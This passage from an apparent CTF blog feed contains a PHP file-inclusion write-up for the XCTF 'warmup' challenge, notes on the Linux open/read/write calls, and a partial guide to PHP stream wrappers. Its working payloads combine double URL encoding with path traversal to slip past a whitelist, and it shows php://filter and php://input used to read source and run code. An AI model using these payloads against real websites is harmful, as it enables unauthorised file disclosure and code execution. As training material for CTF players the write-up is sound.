range(<span class="number">0</span>,len(line)):</span><br><span class="line">            s += line[i]</span><br><span class="line">            <span class="keyword">if</span> i &lt; len(line) - <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> (line[i+<span class="number">1</span>] == <span class="string">"D"</span> <span class="keyword">and</span> line[i<span class="number">-2</span>] == <span class="string">"0"</span>) <span class="keyword">or</span> (line[i] == <span class="string">"o"</span> <span class="keyword">and</span> line[i+<span class="number">1</span>] == <span class="string">"f"</span>):</span><br><span class="line">                    s += chr(int(<span class="string">"0x00"</span>,<span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">"1"</span>)</span><br><span class="line">    print(base64.b64encode(bytes(s,encoding=<span class="string">"gbk"</span>)))</span><br></pre></td></tr></table></figure></p><p>得到如下flag：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-文件包含问题"><a href="#0x02-文件包含问题" class="headerlink" title="0x02 文件包含问题"></a><font color="navy"><code>0x02 文件包含问题</code></font></h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a><font color="blue"><code>基础知识</code></font></h3><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：<code>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</code></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：<code>include()</code>、<code>require()</code>，这两者的区别有：</p><ol><li><code>include</code> 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行</li><li><code>require</code> 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次</p></blockquote><h3 id="【XCTF-web】warmup"><a href="#【XCTF-web】warmup" class="headerlink" title="【XCTF-web】warmup"></a><font color="blue"><code>【XCTF-web】warmup</code></font></h3><h4 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-3.png" alt></p><blockquote><p>从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们从上文源码中可以看到，还有一个<code>hint.php</code>文件，我们打开一下看看里面有什么提示信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><blockquote><p>从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。</p></blockquote><p>下面我们分析上面的PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是：</p><ol><li>输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True）</li><li>is_string()：要求输入的是字符串是字符串</li><li>要满足checkFile函数返回的是True</li></ol><p>下面我们就分析一下checkFile，我们要使得他的返回值为True</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们的输入为非空字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ①</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先会执行<code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>，该函数会返回输入字符串之后加上<code>?</code>之后的首次出现<code>?</code>的位置，<code>mb_substr</code>函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为②</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③</p></blockquote><h4 id="3-构造payload-2"><a href="#3-构造payload-2" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③</p><p>② 处的payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?(payload) 或者为 ?file=source.php%3F(payload)</span><br></pre></td></tr></table></figure><p>③ 处的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253F(payload)</span><br></pre></td></tr></table></figure><p>下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现<code>ffffllllaaaagggg</code>在/../../../../ffffllllaaaagggg中，所以payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%3F/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h4 id="4-目录遍历问题"><a href="#4-目录遍历问题" class="headerlink" title="4.目录遍历问题"></a><code>4.目录遍历问题</code></h4><p>经过测试发现并确定，这种包含的前提是<code>包含的文件必须是当前文件夹不存在的文件</code>，<strong>只有这样才会将该文件解析成目录</strong>，从而遍历其他文件；此处<font color="navy"><strong>hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次<code>../</code>仅仅又是回到当前source.php的目录下</strong></font>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">目录遍历</th><th style="text-align:left">解析</th></tr></thead><tbody><tr><td style="text-align:left">../</td><td style="text-align:left">/var/www/html</td></tr><tr><td style="text-align:left">../../</td><td style="text-align:left">/var/www</td></tr><tr><td style="text-align:left">../../../</td><td style="text-align:left">/var</td></tr><tr><td style="text-align:left">../../../../</td><td style="text-align:left">/</td></tr></tbody></table></div><p>此外，在<code>Windows</code>下<code>hint.php?</code>无法被解析为目录，在<code>linux</code>下成功认为是目录，原因为Windows系统文件命名不支持问号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-函数漏洞问题&quot;&gt;&lt;a href=&quot;#0x00-函数漏洞问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 函数漏洞问题&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 函数漏洞问题&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF中常见的函数总结</title>
    <link href="https://muzibing.github.io/2020/07/27/2020.07.27%EF%BC%88141%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/27/2020.07.27（141）/</id>
    <published>2020-07-26T16:00:00.000Z</published>
    <updated>2020-07-27T10:54:59.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-pwn题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pwn题font"></a> <font color="navy"><code>0x00 pwn题</code></font></h2><h3 id="font-color-blue1open函数font"><a class="markdownIt-Anchor" href="#font-color-blue1open函数font"></a> <font color="blue"><code>1.open()函数</code></font></h3><h4 id="函数原型"><a class="markdownIt-Anchor" href="#函数原型"></a> <code>函数原型</code></h4><blockquote><p><code>int open(const char *path, int flags,int mode)；</code></p></blockquote><p><code>flags</code></p><table><thead><tr><th style="text-align:center">常量名称</th><th style="text-align:center">数字</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">O_RDONLY</td><td style="text-align:center">0</td><td style="text-align:center">只读模式</td></tr><tr><td style="text-align:center">O_WRONLY</td><td style="text-align:center">1</td><td style="text-align:center">只写模式</td></tr><tr><td style="text-align:center">O_RDWR</td><td style="text-align:center">2</td><td style="text-align:center">可读可写</td></tr></tbody></table><h4 id="函数功能"><a class="markdownIt-Anchor" href="#函数功能"></a> <code>函数功能</code></h4><blockquote><p>以各种方式打开文件</p></blockquote><h4 id="函数返回值"><a class="markdownIt-Anchor" href="#函数返回值"></a> <code>函数返回值</code></h4><blockquote><p>如果调用成功，它将返回一个可以被<code>read</code>和<code>write</code>等其他系统调用使用的<font color="red"><code>文件描述符</code></font>。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’</p></blockquote><p><code>返回的文件描述符</code></p><blockquote><p>fd的值一般是<code>3</code>开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。</p></blockquote><h4 id="系统调用号"><a class="markdownIt-Anchor" href="#系统调用号"></a> <code>系统调用号</code></h4><blockquote><p><code>2 open sys_open fs/open.c</code></p></blockquote><h3 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h3><h4 id="头文件"><a class="markdownIt-Anchor" href="#头文件"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-2"><a class="markdownIt-Anchor" href="#函数原型-2"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p></blockquote><h4 id="函数功能-2"><a class="markdownIt-Anchor" href="#函数功能-2"></a> <code>函数功能</code></h4><blockquote><p>读取文件内容：<strong>read()会把参数<code>fd</code>所指的文件传送 <code>count</code>个字节到buf 指针所指的内存中</strong>。</p></blockquote><h4 id="函数返回值-2"><a class="markdownIt-Anchor" href="#函数返回值-2"></a> <code>函数返回值</code></h4><blockquote><p>参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动：</p><ul><li>当文件的整体字节比<code>count</code>小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。</li><li>当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。</li></ul></blockquote><h4 id="测试用例"><a class="markdownIt-Anchor" href="#测试用例"></a> <code>测试用例</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY);<span class="comment">//只读模式打开文件</span></span><br><span class="line">    res = read(fp,buffer,<span class="number">60</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bits,they are %s\n"</span>,res,buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strerror(errno));</span><br><span class="line">    close(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用号-2"><a class="markdownIt-Anchor" href="#系统调用号-2"></a> <code>系统调用号</code></h4><blockquote><p><code>0 read sys_read fs/read_write.c</code></p></blockquote><h3 id="font-color-blue3write函数font"><a class="markdownIt-Anchor" href="#font-color-blue3write函数font"></a> <font color="blue"><code>3.write()函数</code></font></h3><h4 id="头文件-2"><a class="markdownIt-Anchor" href="#头文件-2"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-3"><a class="markdownIt-Anchor" href="#函数原型-3"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t write(int fd,const void *buf, size_t count);·</code></p><ul><li><strong>fd</strong>：是文件描述符（write所对应的是写，即就是1，这是标准输出）</li><li><strong>buf</strong>：通常是一个字符串，需要写入的字符串</li><li><strong>count</strong>：是每次写入的字节数</li></ul></blockquote><h4 id="函数功能-3"><a class="markdownIt-Anchor" href="#函数功能-3"></a> <code>函数功能</code></h4><blockquote><p>打印文件内容</p></blockquote><h4 id="函数返回值-3"><a class="markdownIt-Anchor" href="#函数返回值-3"></a> <code>函数返回值</code></h4><blockquote><ul><li><p>成功：返回读出的字节数</p></li><li><p>失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0</p></li></ul></blockquote><h4 id="系统调用号-3"><a class="markdownIt-Anchor" href="#系统调用号-3"></a> <code>系统调用号</code></h4><blockquote><p><code>1 write sys_write fs/read_write.c</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-pwn题font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-pwn题font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T07:00:53.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><ul><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p></li></ul><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<strong>|</strong>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p></li></ul><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td style="text-align:left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td style="text-align:left">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 